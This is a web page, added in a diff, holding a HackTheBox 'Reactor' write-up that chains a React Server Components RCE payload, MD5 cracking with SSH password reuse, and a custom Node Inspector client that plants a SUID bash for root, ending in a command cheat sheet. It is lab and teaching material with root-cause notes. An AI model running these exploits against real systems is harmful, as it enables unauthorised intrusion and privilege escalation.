@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data:; connect-src 'self' https://cloudflareinsights.com; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>HTB: Reactor — S. Markakis</title>
+<meta name="description" content="React Server Components prototype-pollution RCE (CVE-2025-55182) into a Next.js dashboard, an unsalted MD5 cracked to an SSH password, and a root Node.js Inspector bound to loopback driven over the DevTools protocol for root.">
+<meta property="og:title" content="HTB: Reactor — S. Markakis">
+<meta property="og:description" content="React Server Components prototype-pollution RCE (CVE-2025-55182) into a Next.js dashboard, an unsalted MD5 cracked to an SSH password, and a root Node.js Inspector bound to loopback driven over the DevTools protocol for root.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://s-markakis.github.io/writeups/htb-reactor.html">
+<meta property="og:image" content="https://s-markakis.github.io/writeups/assets/og/htb-reactor.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s-markakis.github.io/writeups/assets/og/htb-reactor.png">
+<link rel="canonical" href="https://s-markakis.github.io/writeups/htb-reactor.html">
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow+Condensed:wght@700;800&family=Barlow:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root {
+    --bg:        #eae8e3;
+    --bg-code:   #dddbd5;
+    --bg-term:   #d4d2cc;
+    --text:      #888880;
+    --text-dark: #1a1a18;
+    --text-mid:  #555550;
+    --border:    #c8c6c0;
+    --tag-bg:    #d8d6d0;
+    --tag-text:  #555550;
+    --accent:    #1a1a18;
+    /* terminal colors — muted to stay on-brand */
+    --t-user:    #4a7c59;
+    --t-host:    #5a6e8a;
+    --t-path:    #7a6040;
+    --t-cmd:     #1a1a18;
+    --t-out:     #666660;
+    --t-yellow:  #8a7030;
+    --t-red:     #8a3030;
+    --t-green:   #3a6a48;
+    --t-comment: #aaa89f;
+    --t-blue:    #3a5a7a;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Barlow', sans-serif;
+    font-size: 17px;
+    line-height: 1.75;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── NAV ── */
+
+  /* ── WRAPPER ── */
+  .wrapper {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 780px;
+    margin: 0 auto;
+    padding: 4rem 2rem 8rem;
+  }
+
+  /* ── POST HEADER ── */
+  .post-header { margin-bottom: 2.5rem; }
+
+  h1 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 3.2rem;
+    line-height: 1.05;
+    color: var(--text-dark);
+    letter-spacing: -.01em;
+    margin-bottom: 1rem;
+  }
+
+  .post-meta {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    flex-wrap: wrap;
+  }
+  .post-meta .date { color: var(--text); }
+
+  .tag {
+    background: var(--tag-bg);
+    color: var(--tag-text);
+    font-size: 0.72rem;
+    font-weight: 600;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    padding: .2rem .6rem;
+    border-radius: 3px;
+  }
+  .tag-htb  { background: #c8d8c0; color: #2a4a28; }
+  .tag-git  { background: #d8c8b8; color: #5a3a18; }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 2rem 0;
+  }
+
+  /* ── OVERVIEW BOX ── */
+  .overview {
+    background: var(--bg-code);
+    border-left: 3px solid var(--text-dark);
+    padding: 1.2rem 1.5rem;
+    margin: 2rem 0;
+    font-size: 0.95rem;
+    line-height: 1.7;
+    color: var(--text-mid);
+  }
+
+  /* ── ATTACK CHAIN ── */
+  .chain {
+    display: flex;
+    flex-wrap: wrap;
+    align-items: center;
+    gap: .4rem;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    padding: .9rem 1.2rem;
+    border-radius: 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+    margin: 1.5rem 0 2.5rem;
+    color: var(--text-mid);
+  }
+  .chain-node {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text-dark);
+    padding: .2rem .7rem;
+    border-radius: 3px;
+    font-weight: 500;
+  }
+  .chain-arrow { color: var(--text); }
+
+  /* ── HEADINGS ── */
+  h2 {
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 800;
+    font-size: 1.9rem;
+    color: var(--text-dark);
+    margin: 3rem 0 .8rem;
+    letter-spacing: -.01em;
+  }
+
+  h3 {
+    font-family: 'Barlow', sans-serif;
+    font-weight: 600;
+    font-size: 1.1rem;
+    color: var(--text-dark);
+    margin: 2rem 0 .6rem;
+  }
+
+  p {
+    color: var(--text);
+    margin-bottom: 1rem;
+  }
+
+  strong { color: var(--text-dark); font-weight: 600; }
+
+  a { color: var(--text-mid); }
+
+  /* ── INLINE CODE ── */
+  code {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.82em;
+    background: var(--bg-code);
+    border: 1px solid var(--border);
+    color: var(--text-mid);
+    padding: .1em .4em;
+    border-radius: 3px;
+  }
+
+  /* ── TERMINAL BLOCK ── */
+  .terminal {
+    background: var(--bg-term);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.4rem 0;
+    overflow: hidden;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    line-height: 1.65;
+  }
+  .term-bar {
+    background: var(--bg-code);
+    border-bottom: 1px solid var(--border);
+    padding: .45rem 1rem;
+    display: flex;
+    align-items: center;
+    gap: .4rem;
+  }
+  .dot { width: 11px; height: 11px; border-radius: 50%; }
+  .dr { background: #c07070; }
+  .dy { background: #b8a050; }
+  .dg { background: #60a070; }
+  .term-label {
+    margin-left: auto;
+    font-size: 0.7rem;
+    color: var(--text);
+    letter-spacing: .05em;
+  }
+  .term-body {
+    padding: 1rem 1.3rem;
+    overflow-x: auto;
+    white-space: pre;
+  }
+
+  /* prompt colors — muted to match cream palette */
+  .pu  { color: var(--t-user);    font-weight: 700; }
+  .ph  { color: var(--t-host);    font-weight: 700; }
+  .pp  { color: var(--t-path); }
+  .ps  { color: var(--t-comment); }
+  .pd  { color: var(--text-mid); }
+  .pc  { color: var(--t-cmd);     font-weight: 500; }
+  .po  { color: var(--t-out); }
+  .py  { color: var(--t-yellow); }
+  .pr  { color: var(--t-red); }
+  .pg  { color: var(--t-green); }
+  .pb  { color: var(--t-blue); }
+  .pco { color: var(--t-comment); }
+
+  /* ── ALERT BOXES ── */
+  .alert {
+    padding: .9rem 1.2rem;
+    margin: 1.4rem 0;
+    border-left: 3px solid;
+    font-size: 0.92rem;
+    border-radius: 0 4px 4px 0;
+  }
+  .alert-info    { background: #d8dde8; border-color: var(--t-blue);  color: #2a3a5a; }
+  .alert-warn    { background: #e8e0c8; border-color: var(--t-yellow); color: #5a4010; }
+  .alert-success { background: #d0ddd0; border-color: var(--t-green); color: #1a3a20; }
+
+  /* ── TABLE ── */
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4rem 0;
+    font-size: 0.88rem;
+  }
+  th {
+    text-align: left;
+    padding: .55rem 1rem;
+    font-family: 'Barlow Condensed', sans-serif;
+    font-weight: 700;
+    font-size: 0.8rem;
+    letter-spacing: .08em;
+    text-transform: uppercase;
+    color: var(--text-mid);
+    border-bottom: 2px solid var(--border);
+    background: var(--bg-code);
+  }
+  td {
+    padding: .5rem 1rem;
+    border-bottom: 1px solid var(--border);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.78rem;
+  }
+  tr:hover td { background: var(--bg-code); }
+
+  /* ── LISTS ── */
+  ul { padding-left: 1.5rem; margin-bottom: 1rem; }
+  li { color: var(--text); margin-bottom: .3rem; }
+
+  /* ── SUMMARY TABLE special cols ── */
+  .st td:nth-child(1) { color: var(--text-dark); font-weight: 600; }
+  .st td:nth-child(2) { color: var(--text-mid); }
+
+  /* ── FOOTER ── */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 2rem 3rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 0.82rem;
+    color: var(--text);
+  }
+  footer a { color: var(--text-mid); text-decoration: none; }
+  footer a:hover { color: var(--text-dark); }
+
+  /* ── BACK LINK ── */
+  .back {
+    display: inline-flex;
+    align-items: center;
+    gap: .4rem;
+    font-size: 0.85rem;
+    color: var(--text);
+    text-decoration: none;
+    margin-bottom: 2.5rem;
+    transition: color .15s;
+  }
+  .back:hover { color: var(--text-dark); }
+
+  /* SCREENSHOTS */
+  .screenshot {
+    max-width: 100%;
+    height: auto;
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    margin: 1.6rem auto;
+    display: block;
+  }
+  picture { display: block; }
+
+  @media (max-width: 600px) {
+    nav { padding: 1rem 1.2rem; }
+    .wrapper { padding: 2rem 1.2rem 5rem; }
+    h1 { font-size: 2.4rem; }
+  }
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --bg-code:#161616; --bg-term:#161616; --border:#2a2a2a;
+    --text:#959086; --text-dark:#f4f3ef; --text-mid:#d4d2cc;
+    --tag-bg:#1e1e1e; --tag-text:#999690; --accent:#f4f3ef;
+    --t-user:#6a9c79; --t-host:#7a8eaa; --t-path:#9a8060; --t-cmd:#f4f3ef;
+    --t-out:#a6a69c; --t-yellow:#aa9050; --t-red:#aa5050; --t-green:#5a8a68;
+    --t-comment:#7a7870; --t-blue:#5a7a9a;
+  }
+</style>
+<script id="sp1r4-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "HTB: Reactor",
+  "description": "React Server Components prototype-pollution RCE (CVE-2025-55182) into a Next.js dashboard, an unsalted MD5 cracked to an SSH password, and a root Node.js Inspector bound to loopback driven over the DevTools protocol for root.",
+  "datePublished": "2026-09-09",
+  "dateModified": "2026-09-09",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://s-markakis.github.io/"
+  },
+  "url": "https://s-markakis.github.io/writeups/htb-reactor.html",
+  "image": "https://s-markakis.github.io/writeups/assets/og/htb-reactor.png",
+  "keywords": [
+    "offensive",
+    "htb"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://s-markakis.github.io/blog.html#htb-reactor"
+  },
+  "timeRequired": "PT8M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Barlow',sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrapper">
+
+  <a class="back" href="https://s-markakis.github.io/blog.html">← Back to posts</a>
+
+  <!-- POST HEADER -->
+  <div class="post-header">
+    <h1>HTB: Reactor</h1>
+    <div class="post-meta">
+      <span class="date">September 9, 2026</span>
+      <span class="tag tag-htb">HackTheBox</span>
+      <span class="tag">Linux</span>
+      <span class="tag">Easy</span>
+      <span>&nbsp;8 min read</span>
+    </div>
+  </div>
+
+  <hr class="divider">
+
+  <!-- OVERVIEW -->
+  <div class="overview">
+    Reactor is a straight line drawn through three modern-stack mistakes. The foothold is <strong>CVE-2025-55182</strong> — the "React2Shell" prototype-pollution RCE in React Server Components — against a Next.js reactor-monitoring dashboard, landing unauthenticated code execution as the <code>node</code> service account. A SQLite file in the app directory holds an <strong>unsalted MD5</strong> that rockyou cracks in seconds; the same string is the <code>engineer</code> user's SSH password. Root is the tidy part: a root-owned <code>uptime-monitor</code> service runs Node with <code>--inspect</code> bound to <code>127.0.0.1:9229</code>, so anyone local can attach to the <strong>Node.js Inspector</strong> over the Chrome DevTools Protocol and <code>Runtime.evaluate</code> arbitrary code inside a root process.
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-reactor/img-dashboard.webp" type="image/webp"><img class="screenshot" src="assets/htb-reactor/img-dashboard.png" alt="ReactorWatch — Core Monitoring System dashboard: core status OK, core temp 324C, pressure 155 bar, coolant flow, turbine output, system logs and on-site personnel panels" width="1477" height="812" loading="lazy" decoding="async"></picture>
+
+  <div class="chain">
+    <span class="chain-node">Next.js :3000</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">CVE-2025-55182 RSC RCE</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">node (uid 999)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">reactor.db — MD5</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">rockyou → reactor1</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">engineer (SSH)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">node --inspect :9229 (root)</span>
+    <span class="chain-arrow">→</span>
+    <span class="chain-node">root</span>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-reactor/img-attack-chain.webp" type="image/webp"><img class="screenshot" src="assets/htb-reactor/img-attack-chain.png" alt="Reactor attack chain: unauthenticated React Server Components RCE for foothold, an unsalted MD5 from reactor.db cracked to the engineer SSH password for user.txt, and a root Node.js Inspector on loopback driven via Runtime.evaluate for root.txt" width="1567" height="551" loading="lazy" decoding="async"></picture>
+
+  <!-- ══ RECON ══ -->
+  <h2>Reconnaissance</h2>
+
+  <h3>Nmap</h3>
+  <p>Two ports. SSH is the exit; everything happens on 3000.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">nmap</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt; -oA reactor</span>
+
+<span class="po">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+3000/tcp open  http    Node.js (Next.js)
+|_http-title: ReactorWatch | Core Monitoring System</span></div>
+  </div>
+
+  <p>Port 3000 is a Next.js app — the response headers make that unambiguous, and they also tell us it is server-rendering React components, which is the whole attack surface for the foothold:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">curl -sI http://&lt;TARGET_IP&gt;:3000/</span>
+    </div>
+    <div class="term-body"><span class="po">HTTP/1.1 200 OK
+Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
+X-Powered-By: Next.js
+Cache-Control: s-maxage=31536000
+Content-Type: text/html; charset=utf-8</span></div>
+  </div>
+
+  <p>The page itself is a static-looking "ReactorWatch" SCADA dashboard — no login, no obvious input. The <code>Vary: RSC</code> header is the hint: this app accepts <strong>React Server Component</strong> action requests, and that is exactly what CVE-2025-55182 abuses.</p>
+
+  <!-- ══ FOOTHOLD ══ -->
+  <h2>Foothold — CVE-2025-55182 (React2Shell)</h2>
+
+  <p><strong>CVE-2025-55182</strong> is an unauthenticated RCE in React Server Components (Next.js tracks its own copy as CVE-2025-66478). The short version: the RSC "server action" reply parser will follow a <code>__proto__</code> key inside the serialised model, and a crafted <code>_response._prefix</code> value is written into a string that the deserialiser later evaluates. Set that prefix to a snippet that reaches <code>child_process</code> and the payload runs in the Node process — no auth, no valid action id needed. The trigger is a single multipart <code>POST /</code> with a <code>Next-Action</code> header and a body shaped like a resolved-promise model:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">the payload gadget (abridged)</span>
+    </div>
+    <div class="term-body"><span class="po">part "0" = {"then":"$5:__proto__:then","status":"resolved_model","reason":-3,
+  "value":"{\"then\":\"$B1A5E\"}",
+  "_response":{
+    </span><span class="pr">"_prefix":"var r=process.mainModule.require('child_process')
+              .execSync('id').toString();
+              throw Object.assign(new Error('NEXT_REDIRECT'),
+              {digest:`NEXT_REDIRECT;push;/login?a=${btoa(r)};307;`});"</span><span class="po">,
+    "_chunks":"$Q2",
+    "_formData":{"get":"$5:constructor:constructor"}}}
+parts "1".."5" wire the reference chain; command output comes back
+base64-encoded in the X-Action-Redirect response header.</span></div>
+  </div>
+
+  <p>Rather than hand-roll the multipart framing, I used a public PoC (<a href="https://github.com/Chocapikk/CVE-2025-55182">Chocapikk/CVE-2025-55182</a>) that builds the gadget and decodes the redirect header for you:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">exploit.py — sanity check</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">python3 exploit.py -u http://&lt;TARGET_IP&gt;:3000 -c "id"</span>
+<span class="pg">Success</span><span class="po">
+uid=999(node) gid=988(node) groups=988(node)</span></div>
+  </div>
+
+  <p>Unauthenticated code execution as <code>node</code>. The app lives in <code>/opt/reactor-app</code>; two files there are worth reading — <code>.env</code> and a SQLite database:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">exploit.py -c "cat .env; sqlite3 reactor.db .dump"</span>
+    </div>
+    <div class="term-body"><span class="po">DB_PATH=/opt/reactor-app/reactor.db
+SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
+ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
+NODE_ENV=production
+---
+CREATE TABLE users (
+    id INTEGER PRIMARY KEY, username TEXT NOT NULL,
+    password_hash TEXT NOT NULL, role TEXT NOT NULL, email TEXT
+);
+INSERT INTO users VALUES(1,'admin',
+  'a203b22191d744a4e70ada5c101b17b8','administrator','admin@reactor.htb');
+INSERT INTO users VALUES(2,'engineer',
+  '39d97110eafe2a9a68639812cd271e8e','operator','engineer@reactor.htb');</span></div>
+  </div>
+
+  <div class="alert alert-warn">Two 32-hex password hashes, no <code>$</code> prefix, no salt column — bare unsalted MD5. A password column that can't tell you its own algorithm is already a finding.</div>
+
+  <!-- ══ CRACK + LATERAL ══ -->
+  <h2>engineer — Crack the MD5, reuse it over SSH</h2>
+
+  <p><code>hashcat</code> mode <code>0</code> is raw MD5. The <code>engineer</code> hash falls to rockyou immediately; <code>admin</code> doesn't crack (and doesn't need to):</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">hashcat -m 0</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">hashcat -m 0 -a 0 hashes.txt rockyou.txt --quiet</span>
+<span class="po">39d97110eafe2a9a68639812cd271e8e:</span><span class="pg">reactor1</span></div>
+  </div>
+
+  <p>The users table stores a web-app role, but people reuse passwords across the boxes that host their apps — and <code>engineer</code> is a real local account:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ssh engineer@&lt;TARGET_IP&gt;</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">sshpass -p 'reactor1' ssh engineer@&lt;TARGET_IP&gt;</span>
+
+<span class="pu">engineer</span><span class="ps">@</span><span class="ph">reactor</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">id &amp;&amp; cat user.txt</span><span class="po">
+uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
+</span><span class="pg">[redacted — user flag]</span><span class="po"></span></div>
+  </div>
+
+  <!-- ══ PRIVESC ══ -->
+  <h2>engineer&nbsp;→&nbsp;root — the Node.js Inspector nobody closed</h2>
+
+  <p>Process and socket enumeration turns up one thing that doesn't belong: a second Node process, owned by <strong>root</strong>, started with <code>--inspect</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">ps -ef / ss -tlnp</span>
+    </div>
+    <div class="term-body"><span class="pu">engineer</span><span class="ps">@</span><span class="ph">reactor</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">ps -ef | grep -E 'inspect|node' | grep -v grep ; ss -tlnp</span>
+
+<span class="po">root  1310  1  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+LISTEN 127.0.0.1:9229    </span><span class="pco"># the V8 inspector — root</span><span class="po">
+LISTEN 127.0.0.1:3000    </span><span class="pco"># the ReactorWatch app — node</span><span class="po">
+LISTEN 0.0.0.0:22</span></div>
+  </div>
+
+  <p><code>/opt/uptime-monitor/worker.js</code> is an unremarkable script — it curls the dashboard every 30&nbsp;s and appends a CSV row. What matters is <em>how</em> it was launched. The <code>--inspect</code> flag opens the <strong>V8 Inspector</strong>: a WebSocket speaking the Chrome DevTools Protocol that lets a client set breakpoints, read memory, and — the useful part — evaluate arbitrary JavaScript <em>in the process</em>. It is bound to loopback, but we have a shell on the box, so loopback is us. There is no token or origin check on the raw protocol.</p>
+
+  <div class="alert alert-info"><code>--inspect</code> is a development flag. In production it is equivalent to leaving a root REPL listening on a socket. The correct posture is: never in prod, and if you must, use <code>--inspect</code> under a dedicated unprivileged user with the port firewalled.</div>
+
+  <h3>Driving the protocol without a debugger</h3>
+
+  <p>The documented path is <code>node inspect 127.0.0.1:9229</code>, but that REPL is awkward to script over SSH, and the box has no <code>ws</code> module and no Python <code>websockets</code> library. The DevTools Protocol is just JSON over a WebSocket, though, and a WebSocket is just an HTTP upgrade plus a 4-byte XOR mask — about forty lines of dependency-free Node. First get the debugger's session UUID from the inspector's HTTP side, then send one <code>Runtime.evaluate</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">cdp.js — minimal CDP client</span>
+    </div>
+    <div class="term-body"><span class="po">const net = require('net'), crypto = require('crypto');
+const [PATH, EXPR] = process.argv.slice(2);
+const key = crypto.randomBytes(16).toString('base64');
+const sock = net.connect(9229, '127.0.0.1', () =&gt; sock.write(
+  `GET ${PATH} HTTP/1.1\r\nHost: 127.0.0.1:9229\r\n` +
+  `Upgrade: websocket\r\nConnection: Upgrade\r\n` +
+  `Sec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`));
+
+function send(obj) {                          </span><span class="pco"># masked text frame</span><span class="po">
+  const p = Buffer.from(JSON.stringify(obj)), m = crypto.randomBytes(4);
+  const h = p.length &lt; 126 ? Buffer.from([0x81, 0x80 | p.length])
+    : Buffer.concat([Buffer.from([0x81, 0xFE]), u16(p.length)]);
+  sock.write(Buffer.concat([h, m, p.map((b,i) =&gt; b ^ m[i % 4])]));
+}
+let up = false, buf = Buffer.alloc(0);
+sock.on('data', d =&gt; {
+  buf = Buffer.concat([buf, d]);
+  if (!up) { if (!buf.includes('\r\n\r\n')) return;
+    up = true; buf = buf.slice(buf.indexOf('\r\n\r\n') + 4);
+    send({ id: 1, method: 'Runtime.evaluate',
+           params: { expression: EXPR, returnByValue: true } }); }
+  const j = readFrame(buf);                   </span><span class="pco"># parse server frame(s)</span><span class="po">
+  if (j &amp;&amp; j.id === 1) { console.log(JSON.stringify(j.result.result)); process.exit(0); }
+});</span></div>
+  </div>
+
+  <p>The expression runs in the worker's global scope, so <code>process.mainModule.require</code> is reachable. Drop a SUID copy of <code>bash</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">attach → Runtime.evaluate → SUID bash</span>
+    </div>
+    <div class="term-body"><span class="pu">engineer</span><span class="ps">@</span><span class="ph">reactor</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">WS=$(curl -s http://127.0.0.1:9229/json | grep -oP '"id": "\K[^"]+')</span>
+<span class="pu">engineer</span><span class="ps">@</span><span class="ph">reactor</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">node cdp.js "/$WS" \
+  "process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rooot &amp;&amp; chmod +s /tmp/rooot; id').toString()"</span><span class="po">
+{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}</span>
+<span class="pu">engineer</span><span class="ps">@</span><span class="ph">reactor</span><span class="ps">:</span><span class="pp">~</span><span class="ps">$ </span><span class="pc">/tmp/rooot -p -c 'id; cat /root/root.txt'</span><span class="po">
+uid=1000(engineer) euid=0(root) gid=1000(engineer) egid=0(root)
+</span><span class="pg">[redacted — root flag]</span><span class="po"></span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-reactor/img-inspector-privesc.webp" type="image/webp"><img class="screenshot" src="assets/htb-reactor/img-inspector-privesc.png" alt="Diagram of the privilege escalation: engineer's dependency-free cdp.js does a raw TCP WebSocket handshake to the root node --inspect listener on 127.0.0.1:9229, sends Runtime.evaluate over the DevTools protocol into the root V8 context, which execSyncs a SUID bash copy that is then run with -p for a root shell and root.txt" width="1568" height="640" loading="lazy" decoding="async"></picture>
+
+  <div class="alert alert-success"><code>bash -p</code> keeps the effective UID from the SUID bit instead of dropping it — that's why the shell is <code>euid=0</code> even though the real UID is still <code>engineer</code>. Plain <code>/tmp/rooot</code> without <code>-p</code> would have dropped back to 1000.</div>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>node</td><td>RSC action-reply deserialiser follows <code>__proto__</code> and evaluates an attacker-controlled <code>_prefix</code> — prototype pollution to RCE, CVE-2025-55182 (CWE-1321 / CWE-94)</td></tr>
+    <tr><td>engineer</td><td>Passwords stored as unsalted MD5; that password reused for the system SSH account (CWE-759 / CWE-521)</td></tr>
+    <tr><td>root</td><td>Root service started with <code>--inspect</code>; V8 Inspector is an unauthenticated code-execution channel to anyone on loopback (CWE-489 / CWE-306)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># Recon</span>
+<span class="pc">nmap -p- --min-rate 2000 -sC -sV &lt;TARGET_IP&gt;</span>
+<span class="pc">curl -sI http://&lt;TARGET_IP&gt;:3000/            # X-Powered-By: Next.js, Vary: RSC</span>
+
+<span class="pco"># Foothold — CVE-2025-55182 RSC prototype-pollution RCE</span>
+<span class="pc">python3 exploit.py -u http://&lt;TARGET_IP&gt;:3000 -c "id"        # uid=999(node)</span>
+<span class="pc">python3 exploit.py -u http://&lt;TARGET_IP&gt;:3000 -c "sqlite3 /opt/reactor-app/reactor.db .dump"</span>
+
+<span class="pco"># engineer — crack + reuse</span>
+<span class="pc">hashcat -m 0 -a 0 hashes.txt rockyou.txt            # 39d9... : reactor1</span>
+<span class="pc">ssh engineer@&lt;TARGET_IP&gt;                             # user.txt</span>
+
+<span class="pco"># root — attach to the root Node.js Inspector on 127.0.0.1:9229</span>
+<span class="pc">ps -ef | grep -- --inspect ; curl -s http://127.0.0.1:9229/json</span>
+<span class="pc">node cdp.js "/$WS" "process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rooot &amp;&amp; chmod +s /tmp/rooot')"</span>
+<span class="pc">/tmp/rooot -p -c 'cat /root/root.txt'</span></div>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
